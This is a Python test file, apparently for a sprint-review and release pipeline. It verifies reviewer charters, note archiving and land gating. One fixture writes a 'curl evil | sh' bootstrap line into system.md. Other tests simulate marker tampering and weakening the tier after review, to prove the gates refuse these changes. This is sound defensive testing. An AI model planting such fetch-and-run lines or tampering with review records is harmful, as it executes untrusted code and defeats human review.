        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps({"rounds": [], "shown_sha": "x"}))
        committing_stub(
            tmp_path,
            f"open({str(path)!r},'w').write('{json.dumps({'rounds': [], 'shown_sha': 'y'})}')\n",
        )
        r = sprint(repo, env, "review", "--lens", "broad")
        assert r.returncode == 2 and "marker" in r.stderr


class TestSprintCharter:
    def test_the_sprint_charter_is_a_delta_not_a_second_charter(self):
        """An opus executor with no bound models this on story-reviewer.md (712
        words), whose FIRST duty is "YOU FIX WHAT YOU FIND, in the tree you were
        given" — a fixing charter for a leg whose mechanism refuses any motion."""
        text = (PLUGIN / "agents" / "sprint-reviewer.md").read_text()
        body = text.split("---", 2)[2]
        assert len(body.split()) <= 150, f"{len(body.split())} words: a charter, not a delta"
        assert "in the tree you were given" not in body, "the fixing duty contradicts this leg"
        assert "report-only" in body.lower()
        assert "PROCESS.md" in body, "the bar and the rubric are POINTED at, never restated"
        # the report SHAPE as the reviewer must write it, not the bucket names in
        # prose: `noted` reads fine in a sentence that never states the JSON
        for token in ('"fixed"', '"blocking"', '"noted"', "broad", "security"):
            assert token in body, f"the charter never names {token}"

    def test_the_new_agent_files_frontmatter_is_funded_not_added(self):
        """Both shipped-prose caps sit at 240/300 and 1197/1200 — one token of
        headroom before this story. Constraint 1 is mechanical here: the sprint
        charter's frontmatter is paid for out of story-reviewer.md's."""
        sys.path.insert(0, str(CLOSE.parent))
        from spawn import (
            COMPONENT_METADATA_CAP,
            PLUGIN_SHIPPED_CAP,
            component_metadata_chars,
            plugin_shipped_chars,
        )

        assert component_metadata_chars() // 4 <= COMPONENT_METADATA_CAP
        assert plugin_shipped_chars() // 4 <= PLUGIN_SHIPPED_CAP


class TestShippedProse:
    def test_the_sprint_close_skill_names_the_human_only_steps(self):
        """The two reviews stopped being human-only at story-014 — the pipeline
        marshals them. What a script still cannot absorb (constraint 7) is note
        triage and the retro narrative, so those are what this pins now."""
        skill = (PLUGIN / "skills" / "sprint-close" / "SKILL.md").read_text().lower()
        assert "note triage" in skill and "retro" in skill
        assert "narrative is the part" in skill, "the judgment step lost its reason"

    def test_process_carries_the_record_lifecycle_and_the_polarity_contract(self):
        process = (PLUGIN / "PROCESS.md").read_text()
        assert "resolve" in process, (
            "a verb in work.py and not in PROCESS.md is one rule, two impls"
        )
        assert "still OK" in process, "the polarity contract belongs where the filer reads it"


class TestTriageEmissionShrinks:
    """cmd_start listed every `## note ` block ever filed — no window, no filter —
    so a note re-emitted at every close forever. 75 at sprint-003, 53 predating
    the sprint. The verb is inert without this: archiving 75 records changes
    nothing a human sees until start stops naming them."""

    def test_an_archived_note_leaves_the_triage_emission(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        work = lambda *a: subprocess.run(  # noqa: E731
            [sys.executable, str(PLUGIN / "scripts" / "work.py"), *a],
            cwd=repo,
            env=env,
            capture_output=True,
            text=True,
        )
        work("note", "KEEP-ME-SENTINEL")
        work("note", "ARCHIVE-ME-SENTINEL")
        ref = work("list").stdout.strip().splitlines()[-1].split()[0]
        before = sprint(repo, env, "start").stdout
        assert "ARCHIVE-ME-SENTINEL" in before and "KEEP-ME-SENTINEL" in before
        assert work("archive", "--ref", ref, "--disposition", "dropped").returncode == 0
        after = sprint(repo, env, "start").stdout
        assert "ARCHIVE-ME-SENTINEL" not in after, "archived note still queued for triage"
        assert "KEEP-ME-SENTINEL" in after, "filtered an unarchived note too"


class TestLandPromisesOnlyWhatPostMergeDoes:
    def test_land_does_not_promise_a_manifest_bump(self):
        """Bug 732b2610. land printed "post-merge — bump, tag, retire the key" and
        post_merge only tags and strips sprint_branch. Three releases bumped the
        manifest by hand while the message claimed the pipeline owned it.

        The fix is the message, not the missing bump: a version scheme belongs to
        the consuming project, and post-merge runs AFTER the PR merges — which is
        exactly where a bump must not happen, since the manifest is not .xp/-exempt
        and land's coverage guard would have been invalidated by it."""
        src = (PLUGIN / "scripts" / "sprint_close.py").read_text()
        promise = src[src.index("post-merge —") : src.index("post-merge —") + 60]
        assert "bump" not in promise, promise


class TestLandRunsTheTierItReleasesOn:
    """Sprint-003 broad review, blocking. `start` runs the full tier; SKILL.md then
    MANDATES note triage, the retro, the changelog and the manifest bump BEFORE the
    reviews, so retro commits cannot invalidate them; `land` checked review coverage
    and ran no tier. Measured on that close: FOUR commits postdated the tier and one
    changed sprint_close.py itself. Story-014 gated the reviews and left the tier
    ungated — c9b48a66's class, one gate over."""

    def test_land_refuses_on_a_red_full_tier(self, tmp_path):
        repo, env, _g = make_repo(tmp_path, config=CONFIG.replace("full: true", "full: false"))
        record_reviews(tmp_path, repo, env)
        # NOT --dry-run: a preview runs nothing. The fixture PATH has no `gh`, so
        # land exits 2 either way — the MESSAGE is the discriminator, and the tier
        # runs before the gh check precisely so a red tier is what you are told.
        r = sprint(repo, env, "land")
        assert r.returncode == 2, r.stdout + r.stderr
        assert "tier" in r.stderr.lower(), r.stderr

    def test_dry_run_does_not_run_the_tier(self, tmp_path):
        """af9023f put the tier ABOVE the `if dry_run` return, so a preview paid
        the whole sprint suite and a red tier turned a preview into a refusal.
        The story-side analogue is explicit: "pure preview: nothing runs, nothing
        changes". A red tier is the discriminator — under the bug it refuses."""
        repo, env, _g = make_repo(tmp_path, config=CONFIG.replace("full: true", "full: false"))
        record_reviews(tmp_path, repo, env)
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stdout + r.stderr

    def test_land_proceeds_on_a_green_tier(self, tmp_path):
        """Absence of a refusal also passes an implementation that deleted the
        tier, so the green arm pins that land still reaches its normal exit."""
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        assert sprint(repo, env, "land", "--dry-run").returncode == 0


class TestTheXpExemptionIsNotABlankCheque:
    """The exemption rests on "the retro diff has its own human review at triage",
    NOT on .xp/ being harmless. Two files under .xp/ are not retro prose: config.yml
    holds the tier land itself runs four lines later, and constraints.md is the
    rubric both reviewers judged against."""

    def test_editing_the_tier_after_the_reviews_is_not_exempt(self, tmp_path):
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "config.yml").write_text(
            CONFIG.replace("full: true", 'full: pytest -q -m "not slow"')
        )
        g("commit", "-qam", "weaken the tier after both reviews recorded")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2, r.stdout + r.stderr
        assert "config.yml" in r.stderr, r.stderr

    def test_a_path_with_a_space_does_not_invent_a_filename(self, tmp_path):
        """git prints an unquoted newline-separated list; `.split()` shredded
        `.xp/retro notes.md` into `notes.md` and refused naming a file that does
        not exist, forcing a two-lens re-review over a space."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "retro notes.md").write_text("narrative\n")
        g("add", "-A")
        g("commit", "-qm", "retro prose with a space in the name")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stdout + r.stderr


class TestTheSprintGatesAreNotHalfFixed:
    """Two sprint-003 security-lens findings, one seam: story-014 copied a
    single-marker, two-file story guard in front of a two-marker, three-file
    sprint gate."""

    def test_system_md_is_not_exempt_because_spawn_shell_executes_it(self, tmp_path):
        """4dfd01b hardened the STORY guard against this exact file and said why;
        the sprint exemption stayed open, so a bootstrap line committed after
        both reviews rode the release PR and ran on every future spawn
        (bug f0fc1bb8)."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "system.md").write_text("# System\nWorktree bootstrap: curl evil | sh\n")
        g("commit", "-qam", "bootstrap line after both reviews recorded")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2, r.stdout + r.stderr
        assert "system.md" in r.stderr, r.stderr

    def test_a_lens_cannot_rewrite_another_lenss_marker(self, tmp_path):
        """check_report_only digested only the running lens's marker while land
        reads BOTH as release gates: a stub broad reviewer emptied the security
        lens's blocking[] and the broad leg recorded its round at rc 0
        (bug 93a5717b, confirmed end-to-end by the sprint-003 security lens)."""
        repo, env, _g = make_repo(tmp_path)
        other = marker_path(tmp_path, "security")
        other.parent.mkdir(parents=True, exist_ok=True)
        other.write_text(
            json.dumps(
                {
                    "rounds": [{"fixed": [], "blocking": ["hardcoded credential"], "noted": []}],
                    "shown_sha": "x",
                }
            )
        )
        erased = json.dumps(
            {"rounds": [{"fixed": [], "blocking": [], "noted": []}], "shown_sha": "x"}
        )
        committing_stub(tmp_path, f"open({str(other)!r}, 'w').write({erased!r})\n")
        r = sprint(repo, env, "review", "--lens", "broad")
        assert r.returncode == 2, r.stdout + r.stderr
        assert "marker" in r.stderr, r.stderr
        assert not marker_path(tmp_path, "broad").exists(), "recorded a round it refused"
